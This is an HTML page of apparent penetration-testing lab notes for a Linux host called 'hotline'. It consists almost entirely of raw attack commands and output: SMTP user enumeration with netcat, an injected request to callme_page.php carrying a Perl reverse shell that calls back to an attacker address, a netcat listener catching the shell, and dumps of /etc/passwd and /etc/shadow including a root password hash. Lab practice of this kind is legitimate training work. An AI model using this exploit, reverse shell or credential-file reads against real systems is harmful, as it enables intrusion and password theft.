@@ -1,0 +1,115 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>10.11.1.217  hotline - linux</title>
+</head><body>https://www.exploit-db.com/exploits/36305/<br/>
+<br/>
+<br/>
+<br/>
+root@kali:~/gen/smtp# nc -nv 10.11.1.217 25<br/>
+(UNKNOWN) [10.11.1.217] 25 (smtp) open<br/>
+220 hotline.localdomain ESMTP Postfix<br/>
+vrfy root<br/>
+252 2.0.0 root<br/>
+vrfy bob<br/>
+550 5.1.1 &lt;bob&gt;: Recipient address rejected: User unknown in local recipient table<br/>
+vrfy kevin<br/>
+550 5.1.1 &lt;kevin&gt;: Recipient address rejected: User unknown in local recipient table<br/>
+<br/>
+<br/>
+<br/>
+<img src="screenshot.png" /><br/>
+<br/>
+<br/>
+https://10.11.1.217/recordings/misc/callme_page.php?action=c&amp;callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22%2710.11.0.175%27%3a%274444%27%22%29%3bSTDIN-%3Efdopen%28%24c%2cr%29%3b%24~-%3Efdopen%28%24c%2cw%29%3bsystem%24_%20while%3C%3E%3b%27%0D%0A%0D%0A<br/>
+<br/>
+<br/>
+<br/>
+<img src="screenshot 2.png" /><br/>
+<br/>
+root@kali:~/gen/nc# nc -nlvp 4444<br/>
+listening on [any] 4444 ...<br/>
+connect to [10.11.0.175] from (UNKNOWN) [10.11.1.217] 51898<br/>
+id<br/>
+uid=100(asterisk) gid=101(asterisk)<br/>
+dir<br/>
+sess_07da12dkqujgdqige26p67qel0 &nbsp;sess_o6qnfdb1t2nn616rdcsflqe6c7<br/>
+sess_i8kt093dkorafdfqojibtiq3j6 &nbsp;vmware-root<br/>
+cd ..<br/>
+ls<br/>
+sess_07da12dkqujgdqige26p67qel0<br/>
+sess_i8kt093dkorafdfqojibtiq3j6<br/>
+sess_o6qnfdb1t2nn616rdcsflqe6c7<br/>
+vmware-root<br/>
+cd ..<br/>
+cd /<br/>
+ls<br/>
+sess_07da12dkqujgdqige26p67qel0<br/>
+sess_i8kt093dkorafdfqojibtiq3j6<br/>
+sess_o6qnfdb1t2nn616rdcsflqe6c7<br/>
+vmware-root<br/>
+cat /etc/passwd<br/>
+root:x:0:0:root:/root:/bin/bash<br/>
+bin:x:1:1:bin:/bin:/sbin/nologin<br/>
+daemon:x:2:2:daemon:/sbin:/sbin/nologin<br/>
+adm:x:3:4:adm:/var/adm:/sbin/nologin<br/>
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br/>
+sync:x:5:0:sync:/sbin:/bin/sync<br/>
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br/>
+halt:x:7:0:halt:/sbin:/sbin/halt<br/>
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br/>
+news:x:9:13:news:/etc/news:<br/>
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin<br/>
+operator:x:11:0:operator:/root:/sbin/nologin<br/>
+games:x:12:100:games:/usr/games:/sbin/nologin<br/>
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin<br/>
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br/>
+nobody:x:99:99:Nobody:/:/sbin/nologin<br/>
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash<br/>
+distcache:x:94:94:Distcache:/:/sbin/nologin<br/>
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin<br/>
+pcap:x:77:77::/var/arpwatch:/sbin/nologin<br/>
+ntp:x:38:38::/etc/ntp:/sbin/nologin<br/>
+cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash<br/>
+dbus:x:81:81:System message bus:/:/sbin/nologin<br/>
+apache:x:48:48:Apache:/var/www:/sbin/nologin<br/>
+mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin<br/>
+rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin<br/>
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin<br/>
+asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash<br/>
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin<br/>
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin<br/>
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br/>
+spamfilter:x:500:500::/home/spamfilter:/bin/bash<br/>
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin<br/>
+xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin<br/>
+<br/>
+<br/>
+cat /etc/shadow<br/>
+root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7:::<br/>
+vcsa:!!:15422:0:99999:7:::<br/>
+pcap:!!:15422:0:99999:7:::<br/>
+ntp:!!:15422:0:99999:7:::<br/>
+cyrus:!!:15422:0:99999:7:::<br/>
+dbus:!!:15422:0:99999:7:::<br/>
+apache:!!:15422:0:99999:7:::<br/>
+mailman:!!:15422:0:99999:7:::<br/>
+rpc:!!:15422:0:99999:7:::<br/>
+postfix:!!:15422:0:99999:7:::<br/>
+asterisk:!!:15422:0:99999:7:::<br/>
+rpcuser:!!:15422:0:99999:7:::<br/>
+nfsnobody:!!:15422:0:99999:7:::<br/>
+sshd:!!:15422:0:99999:7:::<br/>
+spamfilter:!!:15422:0:99999:7:::<br/>
+haldaemon:!!:15422:0:99999:7:::<br/>
+xfs:!!:15422:0:99999:7:::<br/>
+<br/>
+<br/>
+uname -a Linux hotline 2.6.18-238.12.1.el5 #1 SMP Tue May 31 13:23:01 EDT 2011 i686 i686 i386 GNU/Linux<br/>
+<br/>
+<b>c</b>at /proc/version<br/>
+Linux version 2.6.18-238.12.1.el5 (mockbuild@builder10.centos.org) (gcc version 4.1.2 20080704 (Red Hat 4.1.2-50)) #1 SMP Tue May 31 13:23:01 EDT 2011<b><br/>
+</b><b><br/>
+</b>&nbsp;<br/>
+</body></html>
